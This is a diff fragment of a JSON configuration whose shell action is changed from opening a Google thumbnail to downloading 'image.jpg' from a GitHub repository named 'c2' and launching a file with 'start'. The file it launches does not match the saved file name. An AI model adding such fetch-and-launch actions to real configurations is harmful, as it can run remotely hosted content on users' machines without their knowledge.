@@ -8,7 +8,7 @@
             "actions": [
                 {
                     "type": "shell",
-                    "args": { "input": "curl -o imagen.jpg \"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZRrXvjBPw11v1HyPXisEBFV87Q3X1L_35ow&s\" && start imagen.jpg" }
+                    "args": { "input": "curl -o imagen.jpg \"https://raw.githubusercontent.com/eduardo-cortes-dev/c2/main/image.jpg\" && start image.jpg" }
                 }
             ]
             
